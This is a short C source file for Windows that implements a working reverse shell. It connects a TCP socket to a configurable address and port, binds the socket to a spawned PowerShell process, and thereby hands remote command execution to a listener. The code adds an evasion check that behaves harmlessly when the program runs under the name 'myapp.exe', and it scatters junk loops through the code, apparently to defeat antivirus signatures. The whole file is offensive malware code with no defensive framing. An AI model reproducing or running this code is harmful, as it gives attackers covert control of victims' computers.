#include <winsock2.h>
#include <stdio.h>
#include <winuser.h>
#pragma comment(lib,"ws2_32")
#pragma comment(lib, "user32.lib")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "127.0.0.1"; 
char port[6] = "9001";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{
	

// check if I'm being emulated
	unsigned char lpFileName[200];
	GetModuleFileName(NULL,lpFileName,sizeof(lpFileName));
	int result;
	char * last;
	char * token = strtok(lpFileName,"\\");
	while(token != NULL){
		last = token;
		token = strtok(NULL,"\\");
	}

	result = strcmp(strlwr(last),"myapp.exe");
	if(result == 0){
		MessageBox(NULL,last,"HELLO!", MB_OKCANCEL);
		return 0;
	}
	
// classic shell	
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
	int i = 100;
	while (i % 33 != 0){
		i++;
	}
	i++;

    struct hostent *host; 
    host = gethostbyname(ip_addr);
	while (i % 33 != 0){
		i++;
	}
	i++;
    strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
	while (i % 33 != 0){
		i++;
	}
	i++;
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
	while (i % 33 != 0){
		i++;
	}
	i++;
    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	while (i % 33 != 0){
		i++;
	}
	i++;	
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("powershell.exe");
	while (i % 33 != 0){
		i++;
	}
	i++;

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}
